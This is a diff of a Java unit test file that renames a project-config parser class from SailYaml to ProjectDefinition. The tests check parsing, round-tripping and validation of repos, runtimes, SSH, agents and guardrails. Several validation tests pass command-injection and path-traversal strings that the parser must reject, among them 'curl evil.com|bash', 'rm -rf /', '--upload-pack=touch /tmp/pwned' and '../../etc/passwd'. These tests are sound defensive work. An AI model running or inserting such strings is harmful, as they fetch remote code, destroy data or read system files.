@@ -17,7 +17,7 @@ import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.Test;
 
-class SailYamlTest {
+class ProjectDefinitionTest {
 
   private static final String EXAMPLE_YAML =
       """
@@ -90,7 +90,7 @@ class SailYamlTest {
 
   @Test
   void parsesCompleteYaml() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
     assertEquals("acme-health", config.name());
     assertEquals("Acme Health Platform", config.description());
@@ -143,7 +143,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of("url", "--upload-pack=touch /tmp/pwned", "path", "evil")));
     assertTrue(ex.getMessage().contains("repos[].url"));
   }
@@ -152,18 +152,18 @@ class SailYamlTest {
   void repoFromMapRejectsUrlWithoutKnownScheme() {
     assertThrows(
         IllegalArgumentException.class,
-        () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
+        () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
   }
 
   @Test
   void repoFromMapAcceptsHttpsAndScpUrls() {
     var https =
-        SailYaml.Repo.fromMap(
+        ProjectDefinition.Repo.fromMap(
             java.util.Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
     assertEquals("https://github.com/acme/backend.git", https.url());
 
     var scp =
-        SailYaml.Repo.fromMap(
+        ProjectDefinition.Repo.fromMap(
             java.util.Map.of("url", "git@github.com:acme/backend.git", "path", "backend"));
     assertEquals("git@github.com:acme/backend.git", scp.url());
   }
@@ -173,7 +173,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Resources.fromMap(java.util.Map.of("memory", "8GB", "disk", "50GB")));
+            () ->
+                ProjectDefinition.Resources.fromMap(
+                    java.util.Map.of("memory", "8GB", "disk", "50GB")));
     assertTrue(ex.getMessage().contains("resources.cpu"));
   }
 
@@ -182,13 +184,13 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
+            () -> ProjectDefinition.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
     assertTrue(ex.getMessage().contains("resources.memory"));
   }
 
   @Test
   void runtimesDefaultsToZeroWhenMissing() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of());
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of());
     assertEquals(0, runtimes.jdk());
     assertNull(runtimes.node());
     assertNull(runtimes.maven());
@@ -196,7 +198,7 @@ class SailYamlTest {
 
   @Test
   void runtimesFromMapParsesPartialConfig() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25));
     assertEquals(25, runtimes.jdk());
     assertNull(runtimes.node());
     assertNull(runtimes.maven());
@@ -204,20 +206,22 @@ class SailYamlTest {
 
   @Test
   void runtimesFromMapParsesMaven() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
+    var runtimes =
+        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
     assertEquals("3.9.9", runtimes.maven());
   }
 
   @Test
   void gitFromMapDefaultsAuthToToken() {
-    var git = SailYaml.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
+    var git =
+        ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
     assertEquals("token", git.auth());
   }
 
   @Test
   void gitFromMapAcceptsSshAuth() {
     var git =
-        SailYaml.Git.fromMap(
+        ProjectDefinition.Git.fromMap(
             java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
     assertEquals("ssh", git.auth());
   }
@@ -227,7 +231,7 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Git.fromMap(java.util.Map.of("email", "test@test.com")));
+            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("email", "test@test.com")));
     assertTrue(ex.getMessage().contains("git.name"));
   }
 
@@ -236,7 +240,7 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Git.fromMap(java.util.Map.of("name", "Test")));
+            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test")));
     assertTrue(ex.getMessage().contains("git.email"));
   }
 
@@ -246,7 +250,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Git.fromMap(
+                ProjectDefinition.Git.fromMap(
                     java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "bad")));
     assertTrue(ex.getMessage().contains("git.auth"));
   }
@@ -258,7 +262,7 @@ class SailYamlTest {
     map.put("email", "test@test.com");
     map.put("auth", "ssh");
     map.put("ssh_key", "~/.ssh/id_ed25519");
-    var git = SailYaml.Git.fromMap(map);
+    var git = ProjectDefinition.Git.fromMap(map);
     assertEquals("ssh", git.auth());
     assertEquals("~/.ssh/id_ed25519", git.sshKey());
   }
@@ -266,29 +270,29 @@ class SailYamlTest {
   @Test
   void gitFromMapSshKeyNullWhenAbsent() {
     var git =
-        SailYaml.Git.fromMap(
+        ProjectDefinition.Git.fromMap(
             java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
     assertNull(git.sshKey());
   }
 
   @Test
   void gitToMapIncludesSshKeyWhenSet() {
-    var git = new SailYaml.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
+    var git = new ProjectDefinition.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
     var map = git.toMap();
     assertEquals("~/.ssh/id_ed25519", map.get("ssh_key"));
   }
 
   @Test
   void gitToMapOmitsSshKeyWhenNull() {
-    var git = new SailYaml.Git("Test", "test@test.com", "token", null);
+    var git = new ProjectDefinition.Git("Test", "test@test.com", "token", null);
     var map = git.toMap();
     assertFalse(map.containsKey("ssh_key"));
   }
 
   @Test
   void gitSshKeyRoundTripsViaToMapFromMap() {
-    var original = new SailYaml.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
-    var roundTripped = SailYaml.Git.fromMap(original.toMap());
+    var original = new ProjectDefinition.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
+    var roundTripped = ProjectDefinition.Git.fromMap(original.toMap());
     assertEquals("ssh", roundTripped.auth());
     assertEquals("~/.ssh/id_ed25519", roundTripped.sshKey());
   }
@@ -298,7 +302,7 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Repo.fromMap(java.util.Map.of("path", "my-repo")));
+            () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("path", "my-repo")));
     assertTrue(ex.getMessage().contains("repos[].url"));
   }
 
@@ -307,7 +311,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Repo.fromMap(java.util.Map.of("url", "https://github.com/foo/bar")));
+            () ->
+                ProjectDefinition.Repo.fromMap(
+                    java.util.Map.of("url", "https://github.com/foo/bar")));
     assertTrue(ex.getMessage().contains("repos[].path"));
   }
 
@@ -317,7 +323,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of(
                         "url", "https://github.com/foo/bar", "path", "../../etc/passwd")));
     assertTrue(ex.getMessage().contains("repos[].path"));
@@ -329,7 +335,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Repo.fromMap(
+                ProjectDefinition.Repo.fromMap(
                     java.util.Map.of(
                         "url",
                         "https://github.com/foo/bar",
@@ -345,7 +351,8 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
+            () ->
+                ProjectDefinition.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
     assertTrue(ex.getMessage().contains("Invalid ssh.user"));
   }
 
@@ -354,7 +361,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
+            () ->
+                ProjectDefinition.Runtimes.fromMap(
+                    java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
     assertTrue(ex.getMessage().contains("runtimes.maven"));
   }
 
@@ -363,7 +372,9 @@ class SailYamlTest {
     var ex =
         assertThrows(
             IllegalArgumentException.class,
-            () -> SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
+            () ->
+                ProjectDefinition.Runtimes.fromMap(
+                    java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
     assertTrue(ex.getMessage().contains("runtimes.node"));
   }
 
@@ -376,7 +387,7 @@ class SailYamlTest {
     var serviceMap =
         java.util.Map.<String, Object>of("image", "meilisearch:latest", "environment", envMap);
 
-    var service = SailYaml.Service.fromMap(serviceMap);
+    var service = ProjectDefinition.Service.fromMap(serviceMap);
 
     assertEquals("development", service.environment().get("MEILI_ENV"));
     assertEquals("true", service.environment().get("MEILI_NO_ANALYTICS"));
@@ -385,39 +396,40 @@ class SailYamlTest {
 
   @Test
   void runtimesNodePreservesDoubleVersion() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
     assertEquals("22.4", runtimes.node());
   }
 
   @Test
   void runtimesNodeWholeDoubleBecomesInteger() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
+    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
     assertEquals("22", runtimes.node());
   }
 
   @Test
   void runtimesNodeStringVersionWithMultipleDots() {
-    var runtimes = SailYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
+    var runtimes =
+        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
     assertEquals("24.13.1", runtimes.node());
   }
 
   @Test
   void sshUserReturnsSshUserWhenConfigured() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
     assertEquals("dev", config.sshUser());
   }
 
   @Test
   void sshUserDefaultsToDevWhenNoSshBlock() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
 
     assertEquals("dev", config.sshUser());
   }
 
   @Test
   void repoPathsReturnsAbsolutePathsForEachRepo() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
     var paths = config.repoPaths();
 
@@ -428,7 +440,7 @@ class SailYamlTest {
 
   @Test
   void repoPathsReturnsWorkspaceRootWhenNoRepos() throws Exception {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
 
     var paths = config.repoPaths();
 
@@ -447,7 +459,7 @@ class SailYamlTest {
           - url: "https://github.com/test/app.git"
             path: "app"
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertEquals("/home/alice/workspace/app", config.repoPaths().getFirst());
   }
@@ -464,7 +476,8 @@ class SailYamlTest {
         """;
     var refusal =
         assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)));
+            IllegalArgumentException.class,
+            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));
 
     assertEquals(
         "Unknown guardrail key `idle_timeout` in test/sail.yaml; rename `idle_timeout` to"
@@ -483,7 +496,8 @@ class SailYamlTest {
         """;
     var ex =
         assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)));
+            IllegalArgumentException.class,
+            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));
     assertEquals(
         "Unknown agent key `specs_dir` in test/sail.yaml; remove `specs_dir` from test/sail.yaml"
             + " because specs live in the Sail database.",
@@ -498,7 +512,7 @@ class SailYamlTest {
         agent:
           type: claude-code
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNull(config.agent().guardrails());
   }
@@ -516,7 +530,7 @@ class SailYamlTest {
               - guardrail_triggered
               - agent_session_stopped
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNotNull(config.agent().notifications());
     assertEquals("https://ntfy.sh/singlr-test", config.agent().notifications().url());
@@ -531,7 +545,7 @@ class SailYamlTest {
         agent:
           type: claude-code
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertNull(config.agent().notifications());
   }
@@ -544,7 +558,7 @@ class SailYamlTest {
             description: "Just a name and description"
             """;
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(minimal));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(minimal));
 
     assertEquals("simple-project", config.name());
     assertNull(config.resources());
@@ -556,9 +570,9 @@ class SailYamlTest {
 
   @Test
   void toMapRoundTripsCompleteConfig() throws Exception {
-    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
     var map = original.toMap();
-    var roundTripped = SailYaml.fromMap(map);
+    var roundTripped = ProjectDefinition.fromMap(map);
 
     assertEquals(original.name(), roundTripped.name());
     assertEquals(original.description(), roundTripped.description());
@@ -591,7 +605,7 @@ class SailYamlTest {
 
   @Test
   void toMapOmitsNullFields() throws Exception {
-    var minimal = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var minimal = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
     var map = minimal.toMap();
 
     assertEquals("test", map.get("name"));
@@ -606,7 +620,7 @@ class SailYamlTest {
 
   @Test
   void toMapPreservesServiceEnvironment() throws Exception {
-    var original = SailYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
     var map = original.toMap();
     @SuppressWarnings("unchecked")
     var services = (java.util.Map<String, Object>) map.get("services");
@@ -630,9 +644,9 @@ class SailYamlTest {
             max_duration: 4h
             action: snapshot-and-stop
         """;
-    var original = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
     var map = original.toMap();
-    var roundTripped = SailYaml.fromMap(map);
+    var roundTripped = ProjectDefinition.fromMap(map);
 
     assertEquals("4h", roundTripped.agent().guardrails().maxDuration());
     assertEquals("snapshot-and-stop", roundTripped.agent().guardrails().action());
@@ -653,7 +667,7 @@ class SailYamlTest {
         agent:
           type: codex
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     var updated = config.withNodeRuntime("24.14.1");
 
@@ -666,7 +680,7 @@ class SailYamlTest {
 
   @Test
   void withNodeRuntimeCreatesRuntimesWhenNull() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: test"));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
 
     var updated = config.withNodeRuntime("22.0.0");
 
@@ -688,7 +702,7 @@ class SailYamlTest {
             - claude-code
             - codex
         """;
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     var updated = config.withAgentInstall(List.of("claude-code"));
 
@@ -699,9 +713,9 @@ class SailYamlTest {
 
   @Test
   void eachLaneReadsItsOwnGuardrailsAndItsOwnDefaults() {
-    var bare = SailYaml.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
     var configured =
-        SailYaml.Agent.fromMap(
+        ProjectDefinition.Agent.fromMap(
             Map.of(
                 "type",
                 "claude-code",
@@ -726,9 +740,9 @@ class SailYamlTest {
 
   @Test
   void aRunsLifetimeIsItsLanesLimitAndABuildNothingBoundsHasNone() {
-    var bare = SailYaml.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
     var configured =
-        SailYaml.Agent.fromMap(
+        ProjectDefinition.Agent.fromMap(
             Map.of(
                 "type",
                 "claude-code",
@@ -737,7 +751,7 @@ class SailYamlTest {
                 "review_pipeline",
                 Map.of("guardrails", Map.of("max_duration", "90m"))));
     var unlimited =
-        SailYaml.Agent.fromMap(
+        ProjectDefinition.Agent.fromMap(
             Map.of(
                 "type",
                 "claude-code",
@@ -765,7 +779,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
+                ProjectDefinition.Agent.fromMap(
                     Map.of(
                         "type",
                         "claude-code",
@@ -788,7 +802,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
+                ProjectDefinition.Agent.fromMap(
                     Map.of("type", "claude-code", "review_pipeline", Map.of("guardrails", "90m")),
                     "acme/sail.yaml"));
 
@@ -806,7 +820,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
+                ProjectDefinition.Agent.fromMap(
                     Map.of("type", "claude-code", "guardrails", "4h"), "acme/sail.yaml"));
 
     assertTrue(
@@ -820,7 +834,7 @@ class SailYamlTest {
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                SailYaml.Agent.fromMap(
+                ProjectDefinition.Agent.fromMap(
                     Map.of(
                         "type",
                         "claude-code",
@@ -840,7 +854,7 @@ class SailYamlTest {
   @Test
   void theReviewPipelineSurvivesAnAgentRoundTripAndAnInstallListChange() {
     var agent =
-        SailYaml.Agent.fromMap(
+        ProjectDefinition.Agent.fromMap(
             Map.of(
                 "type",
                 "claude-code",
@@ -863,7 +877,7 @@ class SailYamlTest {
 
     @SuppressWarnings("unchecked")
     var pipeline = (Map<String, Object>) agent.toMap().get("review_pipeline");
-    var reparsed = SailYaml.fromMap(Map.of("name", "acme", "agent", agent.toMap()));
+    var reparsed = ProjectDefinition.fromMap(Map.of("name", "acme", "agent", agent.toMap()));
     var reinstalled = reparsed.withAgentInstall(List.of("claude-code", "codex"));
 
     assertEquals(Map.of("max_duration", "90m", "action", "stop"), pipeline.get("guardrails"));
@@ -936,7 +950,8 @@ class SailYamlTest {
         "agent.review_pipeline.stages[review].brief must be text.",
         refusal(agent + "      - name: review\n        brief: [a]\n"));
     var stage =
-        SailYaml.fromMap(YamlUtil.parseMap(agent + "      - name: review\n        brief: Judge.\n"))
+        ProjectDefinition.fromMap(
+                YamlUtil.parseMap(agent + "      - name: review\n        brief: Judge.\n"))
             .agent()
             .reviewPipeline()
             .stages()
@@ -950,7 +965,8 @@ class SailYamlTest {
 
   private static String refusal(String yaml) {
     return assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)))
+            IllegalArgumentException.class,
+            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)))
         .getMessage();
   }
 
@@ -960,11 +976,11 @@ class SailYamlTest {
         "name: acme\nrepos:\n  - url: https://git.example.com/org/api.git\n    path: api\n"
             + "    forge: github\n  - url: https://gitlab.com/org/web.git\n    path: web\n";
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertEquals("github", config.repos().getFirst().forge());
     assertNull(config.repos().getLast().forge());
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "forge round-trips");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "forge round-trips");
     assertEquals(
         "repos[].forge must be 'github' when set, got: gitlab",
         refusal(yaml.replace("forge: github", "forge: gitlab")));
@@ -975,10 +991,12 @@ class SailYamlTest {
 
   @Test
   void theProjectsMemberDefaultsToItsAgentWithFullAccess() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  type: claude-code\n"));
+    var config =
+        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  type: claude-code\n"));
 
     assertNull(config.agent().member());
-    assertEquals(new SailYaml.Member("claude-code", null, "full"), config.agent().projectMember());
+    assertEquals(
+        new ProjectDefinition.Member("claude-code", null, "full"), config.agent().projectMember());
     assertFalse(config.agent().toMap().containsKey("member"), "init writes no member key");
   }
 
@@ -988,12 +1006,13 @@ class SailYamlTest {
         "name: acme\nagent:\n  type: claude-code\n  install: [claude-code, codex]\n"
             + "  member:\n    agent: codex\n    model: gpt-5-codex\n    mode: read_only\n";
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertEquals(
-        new SailYaml.Member("codex", "gpt-5-codex", "read_only"), config.agent().projectMember());
+        new ProjectDefinition.Member("codex", "gpt-5-codex", "read_only"),
+        config.agent().projectMember());
     assertEquals(List.of("claude-code", "codex"), config.agent().installs());
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "member round-trips");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "member round-trips");
   }
 
   @Test
@@ -1018,7 +1037,8 @@ class SailYamlTest {
 
   @Test
   void aDefinitionNamingNoAgentHasNoMember() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  auto_branch: true\n"));
+    var config =
+        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  auto_branch: true\n"));
 
     assertNull(config.agent().projectMember());
   }
@@ -1050,7 +1070,7 @@ class SailYamlTest {
   @Test
   void aMembersLegacyReadOnlySpellingReadsAsTheWireForm() {
     var config =
-        SailYaml.fromMap(
+        ProjectDefinition.fromMap(
             YamlUtil.parseMap(
                 "name: acme\nagent:\n  type: claude-code\n  member:\n    mode: read-only\n"));
 
@@ -1060,24 +1080,26 @@ class SailYamlTest {
   @Test
   void aBlankMemberFallsBackToEveryDefault() {
     var config =
-        SailYaml.fromMap(
+        ProjectDefinition.fromMap(
             YamlUtil.parseMap(
                 "name: acme\nagent:\n  type: codex\n  member:\n    agent: ''\n    model: ''\n"));
 
-    assertEquals(new SailYaml.Member("codex", null, "full"), config.agent().projectMember());
+    assertEquals(
+        new ProjectDefinition.Member("codex", null, "full"), config.agent().projectMember());
   }
 
   @Test
   void installsFallBackToTheAgentType() {
-    var none = new SailYaml.Agent(null, false, null, false, null, null, null, null);
-    var empty = new SailYaml.Agent("codex", false, null, false, List.of(), null, null, null);
+    var none = new ProjectDefinition.Agent(null, false, null, false, null, null, null, null);
+    var empty =
+        new ProjectDefinition.Agent("codex", false, null, false, List.of(), null, null, null);
 
     assertEquals(List.of(), none.installs());
     assertEquals(List.of("codex"), empty.installs());
   }
 
-  private static SailYaml withProcesses(String processes) {
-    return SailYaml.fromMap(
+  private static ProjectDefinition withProcesses(String processes) {
+    return ProjectDefinition.fromMap(
         YamlUtil.parseMap(
             "name: acme\nservices:\n  postgres:\n    image: postgres:16\n    ports: [5432]\nprocesses:\n"
                 + processes));
@@ -1106,23 +1128,23 @@ class SailYamlTest {
 
     var web = config.processes().get("web");
     assertEquals(
-        new SailYaml.Process(
+        new ProjectDefinition.Process(
             "npm run dev", "app/web", 3000, Map.of("NODE_ENV", "development", "WORKERS", "2")),
         web);
     assertEquals(
-        new SailYaml.Process("node worker.js", null, null, Map.of()),
+        new ProjectDefinition.Process("node worker.js", null, null, Map.of()),
         config.processes().get("worker"));
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "it survives a round trip");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "it survives a round trip");
     assertEquals(Map.of("command", "node worker.js"), config.processes().get("worker").toMap());
   }
 
   @Test
   void aWorkdirIsAPathUnderTheWorkspaceWithOrWithoutDotSlash() {
-    assertEquals("", SailYaml.Process.inWorkspace("."));
-    assertEquals("", SailYaml.Process.inWorkspace("./"));
-    assertEquals("webapp", SailYaml.Process.inWorkspace("./webapp"));
-    assertEquals("a/b", SailYaml.Process.inWorkspace("././a/b"));
-    assertEquals("a/b", SailYaml.Process.inWorkspace("a/b"));
+    assertEquals("", ProjectDefinition.Process.inWorkspace("."));
+    assertEquals("", ProjectDefinition.Process.inWorkspace("./"));
+    assertEquals("webapp", ProjectDefinition.Process.inWorkspace("./webapp"));
+    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("././a/b"));
+    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("a/b"));
   }
 
   @Test
